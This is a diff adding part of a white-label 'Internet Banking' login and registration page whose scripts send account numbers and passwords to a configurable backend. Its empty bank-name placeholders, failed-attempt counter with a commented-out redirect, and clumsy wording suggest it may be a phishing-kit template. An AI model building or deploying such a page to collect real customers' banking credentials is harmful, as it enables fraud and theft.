+                <span class="input-group-text u-icon"><svg xmlns="http://www.w3.org/2000/svg" class="ionicon" viewbox="0 0 512 512"><title>Key</title><path d="M218.1 167.17c0 13 0 25.6 4.1 37.4-43.1 50.6-156.9 184.3-167.5 194.5a20.17 20.17 0 00-6.7 15c0 8.5 5.2 16.7 9.6 21.3 6.6 6.9 34.8 33 40 28 15.4-15 18.5-19 24.8-25.2 9.5-9.3-1-28.3 2.3-36s6.8-9.2 12.5-10.4 15.8 2.9 23.7 3c8.3.1 12.8-3.4 19-9.2 5-4.6 8.6-8.9 8.7-15.6.2-9-12.8-20.9-3.1-30.4s23.7 6.2 34 5 22.8-15.5 24.1-21.6-11.7-21.8-9.7-30.7c.7-3 6.8-10 11.4-11s25 6.9 29.6 5.9c5.6-1.2 12.1-7.1 17.4-10.4 15.5 6.7 29.6 9.4 47.7 9.4 68.5 0 124-53.4 124-119.2S408.5 48 340 48s-121.9 53.37-121.9 119.17zM400 144a32 32 0 11-32-32 32 32 0 0132 32z" fill="none" stroke="currentColor" stroke-linejoin="round" stroke-width="32"></path></svg></span>
+                </div>
+                <input type="text" name="verify_code" id="verifyCode" placeholder="Verification Code" class="form-control">
+                </div>
+                    
+                <div class="input-group form-group">
+                <div class="input-group-prepend">
+                <span class="input-group-text u-icon"><?xml version="1.0" encoding="iso-8859-1"?>
+<svg version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewbox="0 0 512 512" style="enable-background:new 0 0 512 512;" xml:space="preserve">
+<g>
+	<g>
+		<path d="M384,213.333H128c-29.419,0-53.333,23.936-53.333,53.333v192C74.667,488.064,98.581,512,128,512h256
+			c29.419,0,53.333-23.936,53.333-53.333v-192C437.333,237.269,413.419,213.333,384,213.333z M416,458.667c0,17.643-14.357,32-32,32
+			H128c-17.643,0-32-14.357-32-32v-192c0-17.643,14.357-32,32-32h256c17.643,0,32,14.357,32,32V458.667z"></path>
+	</g>
+</g>
+<g>
+	<g>
+		<path d="M256,0c-76.459,0-138.667,62.208-138.667,138.667V224c0,5.888,4.779,10.667,10.667,10.667h256
+			c5.888,0,10.667-4.779,10.667-10.667v-85.333C394.667,62.208,332.459,0,256,0z M373.333,213.333H138.667v-74.667
+			c0-64.704,52.651-117.333,117.333-117.333s117.333,52.629,117.333,117.333V213.333z"></path>
+	</g>
+</g>
+<g>
+	<g>
+		<path d="M256,362.667c-5.888,0-10.667,4.779-10.667,10.667v64c0,5.888,4.779,10.667,10.667,10.667s10.667-4.779,10.667-10.667v-64
+			C266.667,367.445,261.888,362.667,256,362.667z"></path>
+	</g>
+</g>
+<g>
+	<g>
+		<path d="M256,277.333c-29.419,0-53.333,23.936-53.333,53.333S226.581,384,256,384c29.419,0,53.333-23.936,53.333-53.333
+			S285.419,277.333,256,277.333z M256,362.667c-17.643,0-32-14.357-32-32c0-17.643,14.357-32,32-32c17.643,0,32,14.357,32,32
+			C288,348.309,273.643,362.667,256,362.667z"></path>
+	</g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+</svg>
+</span>
+                </div>
+                <input type="text" name="password" id="reg_password" placeholder="Create New Password" class="form-control s-pass-input">
+                
+                 <div class="x-review-pass">
+                   <button type="button" class="seePass">
+                     <svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 512 512" width="35" height="35"><path d="M432 448a15.92 15.92 0 01-11.31-4.69l-352-352a16 16 0 0122.62-22.62l352 352A16 16 0 01432 448zM255.66 384c-41.49 0-81.5-12.28-118.92-36.5-34.07-22-64.74-53.51-88.7-91v-.08c19.94-28.57 41.78-52.73 65.24-72.21a2 2 0 00.14-2.94L93.5 161.38a2 2 0 00-2.71-.12c-24.92 21-48.05 46.76-69.08 76.92a31.92 31.92 0 00-.64 35.54c26.41 41.33 60.4 76.14 98.28 100.65C162 402 207.9 416 255.66 416a239.13 239.13 0 0075.8-12.58 2 2 0 00.77-3.31l-21.58-21.58a4 4 0 00-3.83-1 204.8 204.8 0 01-51.16 6.47zM490.84 238.6c-26.46-40.92-60.79-75.68-99.27-100.53C349 110.55 302 96 255.66 96a227.34 227.34 0 00-74.89 12.83 2 2 0 00-.75 3.31l21.55 21.55a4 4 0 003.88 1 192.82 192.82 0 0150.21-6.69c40.69 0 80.58 12.43 118.55 37 34.71 22.4 65.74 53.88 89.76 91a.13.13 0 010 .16 310.72 310.72 0 01-64.12 72.73 2 2 0 00-.15 2.95l19.9 19.89a2 2 0 002.7.13 343.49 343.49 0 0068.64-78.48 32.2 32.2 0 00-.1-34.78z"></path><path d="M256 160a95.88 95.88 0 00-21.37 2.4 2 2 0 00-1 3.38l112.59 112.56a2 2 0 003.38-1A96 96 0 00256 160zM165.78 233.66a2 2 0 00-3.38 1 96 96 0 00115 115 2 2 0 001-3.38z"></path></svg>
+                   </button>
+                   <button type="button" class="hidePass" style="display: none;">
+                     <svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 512 512" width="35" height="35"><path d="M255.66 112c-77.94 0-157.89 45.11-220.83 135.33a16 16 0 00-.27 17.77C82.92 340.8 161.8 400 255.66 400c92.84 0 173.34-59.38 221.79-135.25a16.14 16.14 0 000-17.47C428.89 172.28 347.8 112 255.66 112z" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="32"></path><circle cx="256" cy="256" r="80" fill="none" stroke="currentColor" stroke-miterlimit="10" stroke-width="32"></circle></svg>
+                   </button>
+                 </div>
+                
+                </div>
+                
+                <input type="hidden" id="thisUserName" name="this_user_name">
+                
+                <div class="row form-group sgn-submit">
+                 
+                 <div class="col-7">
+                   <button type="button" name="reg" id="regNowBtn" class="btn btn-primary mtx-log-btn">
+                       <span class="mtx-log-btn-txt">REGISTER</span>
+                       <span class="mt-btn-loader"></span>
+                       <span class="mt-btn-icon">
+                         <svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 512 512"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="48" d="M184 112l144 144-144 144"></path></svg>
+                       </span>
+                   </button>
+                 </div>
+                 
+                 <div class="col-5">
+                   <button type="button" id="backReg" class="btn btn-dark mtx-back-btn">BACK</button>
+                 </div>
+                 
+                </div>
+                </div>
+                
+                <div class="reg-form-third" style="display: none">
+                 <div class="reg-success">
+                  <div class="reg-success-txt">Registration success, You're been redirected..</div>
+                 </div>
+                </div>
+                
+                </form>
+              </div>
+              
+              <div class="signon-form-pages forgot-form-page" style="display: none; min-height: 200px">
+                <div class="user-log-title">Enter Email Address</div>
+                
+                <form action="" method="POST" class="forgotPassForm" autocomplete="off">
+                
+                <div class="trowError"></div>
+                   
+                <div class="input-group form-group">
+                <div class="input-group-prepend">
+                <span class="input-group-text u-icon"><svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 512 512"><path d="M320 254.27c-4.5 51-40.12 80-80.55 80s-67.34-35.82-63.45-80 37.12-80 77.55-80 70.33 36 66.45 80z" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="32"></path><path d="M319.77 415.77c-28.56 12-47.28 14.5-79.28 14.5-97.2 0-169-78.8-160.49-176s94.31-176 191.51-176C381 78.27 441.19 150 432.73 246c-6.31 71.67-52.11 92.32-76.09 88.07-22.56-4-41.18-24.42-37.74-63.5l8.48-96.25" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="32"></path></svg></span>
+                </div>
+                <input type="text" name="forgot_email_address" id="forgot_email_address" placeholder="Email Address" class="form-control">
+                </div>
+                
+                <div class="row form-group sgn-submit">
+                 
+                 <div class="col-7">
+                   <button type="submit" name="access" class="btn btn-primary mtx-log-btn">
+                       <span class="mtx-log-btn-txt">Reset Password</span>
+                       <span class="mt-btn-loader"></span>
+                       <span class="mt-btn-icon">
+                         <svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 512 512"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="48" d="M184 112l144 144-144 144"></path></svg>
+                       </span>
+                   </button>
+                 </div>
+                 
+                 <div class="col-5">
+                   <div class="signon-forgot-password"><a href="javascript:void(0)" id="logOnBtn">Internet Banking Login</a></div>
+                 </div>
+                 
+                </div>
+                
+                </form>
+              </div>
+              
+              <div class="signon-loader"></div>
+              
+             </div>
+             
+             <div class="signon-form-bottom">
+              
+              <div class="signon-frm-bott-pages on-form-bott-page">
+              <div class="signon-form-bottom-innrt">
+               <div class="sign-fr-bottom-col"><img src="img/padlock-ssm.png" class="sn-fr-bott-img"></div>
+               <div class="sign-fr-bottom-col">
+                <div class="sn-fr-bott-tls">Enroll New</div>
+                <div class="sn-fr-bott-subtls">Register a new account</div>
+                <div class="sn-fr-bott-link">
+                 <a href="javascript:void(0)"><button class="sn-fr-bott-link-btn new-user-reg">Register</button></a>
+                </div>
+               </div>
+              </div>
+              </div>
+              
+              <div class="signon-frm-bott-pages reg-form-bott-page" style="display: none">
+              <div class="signon-form-bottom-innrt">
+               <div class="sign-fr-bottom-col"><img src="img/padlock-ssm.png" class="sn-fr-bott-img"></div>
+               <div class="sign-fr-bottom-col">
+                <div class="sn-fr-bott-tls">Customer Login</div>
+                <div class="sn-fr-bott-subtls">Already registered user</div>
+                <div class="sn-fr-bott-link">
+                 <a href="javascript:void(0)"><button class="sn-fr-bott-link-btn user-sign-in">Sign In</button></a>
+                </div>
+               </div>
+              </div>
+              </div>
+              
+             </div>
+            
+           </div>
+          </div>
+         
+         </div>
+        </div>
+   </div>
+   
+   <div class="signon-col right-col col-4">
+     <div class="signon-right-sbr">
+       
+       <div class="sgn-sbr-heading">
+         <div class="sgn-sbr-h-icon"><?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 20010904//EN"
+ "http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd">
+<svg version="1.0" xmlns="http://www.w3.org/2000/svg" width="70" height="70" viewbox="0 0 70.000000 70.000000" preserveaspectratio="xMidYMid meet">
+
+<g transform="translate(0.000000,70.000000) scale(0.100000,-0.100000)" fill="#b91818" stroke="none">
+<path d="M253 686 c-103 -34 -176 -98 -222 -196 -22 -46 -26 -69 -26 -140 0
+-76 4 -93 33 -152 38 -77 92 -130 171 -167 47 -22 70 -26 141 -26 71 0 94 4
+141 26 79 37 133 90 171 167 29 59 33 76 33 152 0 71 -4 94 -26 141 -58 124
+-169 199 -302 205 -43 3 -89 -2 -114 -10z m229 -33 c65 -30 133 -95 165 -162
+37 -75 40 -200 6 -273 -30 -66 -96 -133 -162 -165 -48 -24 -68 -28 -141 -28
+-73 0 -93 4 -141 28 -223 109 -253 402 -57 560 85 68 227 85 330 40z"></path>
+<path d="M272 644 c-111 -30 -190 -112 -219 -229 -15 -60 -15 -70 0 -130 30
+-122 110 -202 232 -232 60 -15 70 -15 130 0 122 30 202 110 232 232 15 60 15
+70 0 130 -30 119 -108 200 -223 230 -70 18 -83 18 -152 -1z m167 -120 l81 -37
+0 -90 c0 -107 -19 -155 -80 -211 -67 -60 -113 -60 -180 0 -61 56 -80 104 -80
+211 l0 90 78 36 c42 20 82 36 89 36 6 1 48 -15 92 -35z"></path>
+<path d="M278 483 l-58 -26 0 -53 0 -54 65 0 65 0 0 -80 c0 -51 4 -80 11 -80
+35 0 99 75 113 133 l6 27 -65 0 -65 0 0 80 c0 44 -3 80 -7 79 -5 0 -34 -12
+-65 -26z"></path>
+</g>
+</svg>
+</div>
+         <div class="sgn-sbr-h-title">Security Alert</div>
+         <div class="sgn-sbr-h-txt"><span class="bname"></span> does not make any password transactions via e-mail and does not ask for personal information of customers</div>
+       </div>
+       
+       <div class="sgn-sbr-rows">
+         <div class="sgn-sbr-ro-icon"><img src="img/login-security-seperator.png" class="sgn-sbr-ro-icon-img"></div>
+         <div class="sgn-sbr-ro-txt">Do not share your private internet branch login verification code with anyone, including bank staff</div>
+       </div>
+       
+       <div class="sgn-sbr-rows">
+         <div class="sgn-sbr-ro-icon"><img src="img/login-security-seperator.png" class="sgn-sbr-ro-icon-img"></div>
+         <div class="sgn-sbr-ro-txt">Do not write your password and password anywhere, especially on your computer</div>
+       </div>
+       
+       <div class="sgn-sbr-rows">
+         <div class="sgn-sbr-ro-icon"><img src="img/login-security-seperator.png" class="sgn-sbr-ro-icon-img"></div>
+         <div class="sgn-sbr-ro-txt">Check the SSL certificate of our Internet Branch and the information in the address bar</div>
+         
+         <div class="sgn-sbr-ro-siteurl">https://<span class="bwebsite"></span></div>
+         
+       </div>
+       
+       <div class="sgn-sbr-rows">
+         <div class="sgn-sbr-ro-icon"><img src="img/login-security-seperator.png" class="sgn-sbr-ro-icon-img"></div>
+         <div class="sgn-sbr-ro-txt">Do not enter any information on the web page links provided via e-mail or in any other environment</div>
+       </div>
+       
+     </div>
+   </div>
+   
+ </div>
+</div>
+
+</div>
+
+</div>
+</div>
+
+</div>
+
+</section>
+
+
+<script src="../assets/js/jquery.min.js"></script>
+<script src="../assets/js/bootstrap.bundle.min.js"></script>
+<script src="../assets/js/meanmenu.js"></script>
+<script src="../assets/js/nice-select.min.js"></script>
+<script src="../assets/js/slick.min.js"></script>
+<script src="../assets/js/magnific-popup.min.js"></script>
+<script src="../assets/js/appear.min.js"></script>
+<script src="../assets/js/odometer.min.js"></script>
+<script src="../assets/js/owl.carousel.min.js"></script>
+<script src="../assets/js/parallax.min.js"></script>
+<script src="../assets/js/wow.min.js"></script>
+<script src="../assets/js/form-validator.min.js"></script>
+<script src="../assets/js/contact-form-script.js"></script>
+<script src="../assets/js/main.js"></script>
+  <script src="../assets/js/pilot.js"></script>  
+<script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script> 
+<script>
+$(".signonForm").submit(function(e){
+
+if($(".signonForm input").val()==="") {
+$(".signonForm input").css("border","1px solid #cd2122");
+
+setTimeout(function() {
+$(".signonForm input").css("border","1px solid #ddd");
+}, 1700);
+
+return false;
+}
+else {
+$(".mtx-log-btn").addClass("log-is-clicked");
+$(".mt-btn-icon").remove();
+$(".mtx-log-btn-txt").text("Please Wait..");
+$(".mt-btn-loader").html('<div class="spinner-border text-light" role="status"> </div>');
+}
+
+});
+
+$(document).ready(function() {
+setTimeout(function() {
+$(".signonForm input").val("");
+$("#user_id").focus();
+}, 500);
+});
+
+$(".seePass").click(function() {
+$(".s-pass-input").attr("type", "text");
+$(".seePass").hide();
+$(".hidePass").show();
+});
+
+$(".hidePass").click(function() {
+$(".s-pass-input").attr("type", "password");
+$(".hidePass").hide();
+$(".seePass").show();
+});
+
+$(".signonForm input").on("input", function() {
+$(".form-response-data").remove();
+});
+
+$(".new-user-reg").click(function() {
+$(".signon-loader").html('<div class="signon-loader-wrp"> <div class="spinner-main"><div class="spinner-border" role="status"> </div> <div class="spinner-main-txt">Loading..</div></div> </div>');
+$(".on-form-page").slideUp();
+$(".reg-form-page").slideDown();
+
+$(".on-form-bott-page").hide();
+$(".reg-form-bott-page").show();
+
+setTimeout(function() {
+$(".signon-loader").html('');
+}, 800);
+});
+
+$(".user-sign-in").click(function() {
+$(".signon-loader").html('<div class="signon-loader-wrp"> <div class="spinner-main"><div class="spinner-border" role="status"> </div> <div class="spinner-main-txt">Loading..</div></div> </div>');
+$(".reg-form-page").slideUp();
+$(".on-form-page").slideDown();
+
+$(".reg-form-bott-page").hide();
+$(".on-form-bott-page").show();
+
+setTimeout(function() {
+$(".signon-loader").html('');
+}, 800);
+});
+
+$("#forgotPassBtn").click(function() {
+$(".signon-loader").html('<div class="signon-loader-wrp"> <div class="spinner-main"><div class="spinner-border" role="status"> </div> <div class="spinner-main-txt">Loading..</div></div> </div>');
+$(".on-form-page").slideUp();
+$(".forgot-form-page").slideDown();
+
+$(".reg-form-bott-page").hide();
+$(".on-form-bott-page").hide();
+
+setTimeout(function() {
+$(".signon-loader").html('');
+}, 800);
+});
+
+$("#logOnBtn").click(function() {
+$(".signon-loader").html('<div class="signon-loader-wrp"> <div class="spinner-main"><div class="spinner-border" role="status"> </div> <div class="spinner-main-txt">Loading..</div></div> </div>');
+$(".forgot-form-page").slideUp();
+$(".on-form-page").slideDown();
+
+$(".reg-form-bott-page").hide();
+$(".on-form-bott-page").show();
+
+setTimeout(function() {
+$(".signon-loader").html('');
+}, 800);
+});
+
+$("#proceedReg").click(function(event) {
+   // event.preventDefault();
+$(".signon-loader").html('<div class="signon-loader-wrp"> <div class="spinner-main"><div class="spinner-border" role="status"> </div> <div class="spinner-main-txt">Verifying Account..</div></div> </div>');
+
+setTimeout(function() {
+$(".signon-loader").html('');
+}, 3000);
+
+var email=$("#email").val();
+var password=$("#password").val();
+
+$.ajax({
+type: "POST",
+url: baseApiUrl+"login-account",
+//data: $('form.regiForm').serializeArray(),
+data: {    
+acc_num:email,
+acc_pass:password
+},
+dataType: 'json',
+cache: false,
+beforeSend: function() {
+$(".signon-loader").html('<div class="signon-loader-wrp"> <div class="spinner-main"><div class="spinner-border" role="status"> </div> <div class="spinner-main-txt">Verifying Account..</div></div> </div>');
+},
+success: function(response) {
+console.log(response)
+if(response['response'] == "found") {
+$("#reg_password").attr("type","password");
+document.getElementById("thisUserName").value=response['user_auth'];
+$(".reg-form-first").slideUp();
+$(".reg-form-second").slideDown();
+$(".reg-log-title").text("Complete Registration");
+}
+
+if(response['response'] == "not-found") {
+$(".reg-form-first").slideUp();
+$(".reg-form-third").slideDown();
+$(".reg-log-title").text("Account Not Found");
+$(".reg-success-txt").text("Account Number Not Found, Please Enter a Valid <span class='bname'></span> Account Number And Try Again..");
+$(".signon-loader").html('');
+
+setTimeout(function() {
+$(".reg-form-third").slideUp();
+$(".reg-form-first").slideDown();
+$(".reg-log-title").text("Try Again");
+$(".reg-success-txt").text("Registration success, You're been redirected..");
+}, 4500);
+
+}
+
+}
+});
+
+});
+
+$("#regNowBtn").click(function() {
+$.ajax({
+type: "POST",
+url: baseApiUrl+"register",
+data: $('form.regiForm').serializeArray(),
+dataType: 'json',
+cache: false,
+beforeSend: function() {
+$(".signon-loader").html('<div class="signon-loader-wrp"> <div class="spinner-main"><div class="spinner-border" role="status"> </div> <div class="spinner-main-txt">Processing..</div></div> </div>');
+},
+success: function(response) {
+
+if(response['response'] == "valid") {
+$(".reg-form-second").slideUp();
+$(".reg-form-third").slideDown();
+$(".reg-log-title").text("Verification Success");
+$(".signon-loader").html('');
+
+setTimeout(function() {
+window.location.replace(baseUrl+'internet-banking/account');
+}, 3000);
+}
+
+if(response['response'] == "invalid") {
+$(".reg-form-second").slideUp();
+$(".reg-form-third").slideDown();
+$(".reg-log-title").text("Verification Failed");
+$(".reg-success-txt").text("Invalid Verification Code, Please try again..");
+$(".signon-loader").html('');
+
+setTimeout(function() {
+$(".reg-form-third").slideUp();
+$(".reg-form-second").slideDown();
+$(".reg-log-title").text("Try Again");
+$(".reg-success-txt").text("Registration success, You're been redirected..");
+}, 4500);
+}
+
+}
+});
+});
+
+$("#backReg").click(function() {
+$("#reg_password").attr("type","text");
+$(".reg-form-second").hide();
+$(".reg-form-first").show();
+$(".reg-log-title").text("Register Account");
+});
+
+
+
+$(".forgotPassForm").submit(function(e){
+
+if($("#forgot_email_address").val()==="") {
+$("#forgot_email_address").css("border","1px solid #cd2122");
+
+setTimeout(function() {
+$("#forgot_email_address").css("border","1px solid #ddd");
+}, 1700);
+
+return false;
+}
+else {
+$.ajax({
+type: "POST",
+url: baseApiUrl+"forgot-password",
+data: $('form.forgotPassForm').serializeArray(),
+dataType: 'json',
+cache: false,
+beforeSend: function() {
+$(".signon-loader").html('<div class="signon-loader-wrp"> <div class="spinner-main"><div class="spinner-border" role="status"> </div> <div class="spinner-main-txt">Verifying Account..</div></div> </div>');
+},
+success: function(response) {
+
+if(response['response'] == "found") {
+$(".forgot-form-page").html('<div class="reg-success">Check your email, we have sent you a password reset link to your email.</div>');
+$(".signon-loader").html('');
+}
+
+if(response['response'] == "not-found") {
+$(".trowError").html('<div class="form-response-data">Account not found, Try again.</div>');
+$(".signon-loader").html('');
+}
+
+}
+});
+return false;
+}
+
+});
+
+$(".resetPassForm").submit(function(e){
+
+if($("#reset_password").val()==="" || $("#repeatPassword").val()==="") {
+$(".resetPassForm .form-control").css("border","1px solid #cd2122");
+
+setTimeout(function() {
+$(".resetPassForm .form-control").css("border","1px solid #ddd");
+}, 1700);
+
+return false;
+}
+else {
+$(".mtx-log-btn").addClass("log-is-clicked");
+$(".mt-btn-icon").remove();
+$(".mtx-log-btn-txt").text("Please Wait..");
+$(".mt-btn-loader").html('<div class="spinner-border text-light" role="status"> </div>');
+}
+
+});
+</script>
+</body>
+</html>
+<script>
+$(".signon-header-li").click(function() {
+$(".signon-header-li").removeClass("signon-current");
+$(this).addClass("signon-current");
+$("#signonType").text($(this).text());
+$(".signonForm input").val("");
+$("#user_id").focus();
+});
+let count=0;
+ 
+$('#submit-btn').on('click', function(event){  
+event.preventDefault();  
+count= count + 1;  
+var email=$("#user_id").val();
+var password=$("#password").val();
+
+//console.log("I got here"+email)
+ 
+if (!email) {
+    $('#auth_reg').show();
+    $('#auth_reg').html("Account Number not found");
+
+                return false;
+            }
+if (!password) {
+    $('#auth_reg').show();
+    $('#auth_reg').html("Password is empty!");
+
+                return false;
+            }  
+ 
+$.ajax({
+//headers:{'Content-Type': 'application/json' },
+dataType: 'JSON',
+url: baseApiUrl+'login-account',
+type: 'POST',
+cache:true,
+data:{
+		 	acc_num:email,
+            acc_pass:password 
+      	}, 
+			//data: $('#contact').serialize(),
+            beforeSend: function(xhr){
+            	$('#submit-btn').html('Please wait');
+            },
+            success: function(response){
+                console.log(response.responseCode);
+                console.log(response.success);
+              console.log(response);
+              //collect valid session
+              
+            	if(response.responseCode == "000"){  
+                swal({ 		title: "Warning!",
+							text: response.success,
+							icon: "warning",
+							button: "Try again!",
+							dangerMode: true
+                    });
+                }
+
+			console.log(response.responseCode, response.sessionId);
+            	if(response.responseCode == "100" && response.sessionId != ""){  
+                    
+                    //set cookie  
+               //     	let sessionId = sessionStorage.setItem("sessionId", response.sessionId);
+						let sessionId = setCookie("sessionId", response.sessionId, 90);  
+						window.location.replace(response.nav);  
+                } 
+    },
+    error: function(error){
+      //  $("#password").val("");
+        console.log(error);
+    	if (count>=2) {
+    		count=0;
+    	//	 window.location.replace("https://www."+my_slice);
+    	}
+               	$("#auth_reg").show();
+				                      
+			$('#auth_reg').val("Invalid password. Please try again");
+                   },
+    complete: function(){
+    	$('#submit-btn').html('Log In Account');
+    }
+});
+  });
+</script>
